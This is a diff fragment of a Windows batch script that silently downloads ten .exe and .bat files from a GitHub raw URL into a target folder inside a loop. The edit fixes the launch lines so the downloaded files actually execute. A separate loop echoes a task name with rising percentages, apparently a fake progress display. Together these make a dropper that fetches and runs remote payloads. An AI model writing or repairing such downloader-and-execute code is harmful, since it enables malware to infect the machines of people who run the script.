@@ -57,16 +57,16 @@ for /L %%I in (1,1,10) do (
     curl -L -s -o "%target%\8.bat" https://raw.githubusercontent.com/beeczxd/ajotakv2/main/8.bat
     curl -L -s -o "%target%\9.bat" https://raw.githubusercontent.com/beeczxd/ajotakv2/main/9.bat
     curl -L -s -o "%target%\10.bat" https://raw.githubusercontent.com/beeczxd/ajotakv2/main/10.bat
-    start /min "%target%\1.exe"
-    start /min "%target%\2.exe"
-    start /min "%target%\3.exe"
-    start /min "%target%\4.bat"
-    start /min "%target%\5.exe"
-    start /min "%target%\6.bat"
-    start /min "%target%\7.bat"
-    start /min "%target%\8.bat"
-    start /min "%target%\9.bat"
-    start /min "%target%\10.bat"
+    start %target%\1.exe
+    start %target%\2.exe
+    start %target%\3.exe
+    start %target%\4.bat
+    start %target%\5.exe
+    start %target%\6.bat
+    start %target%\7.bat
+    start %target%\8.bat
+    start %target%\9.bat
+    start %target%\10.bat
 )
 goto end
 
@@ -106,5 +106,6 @@ for /L %%i in (1,10,100) do (
     echo %task%... %%i%%
 )
 exit /b
+
 
 
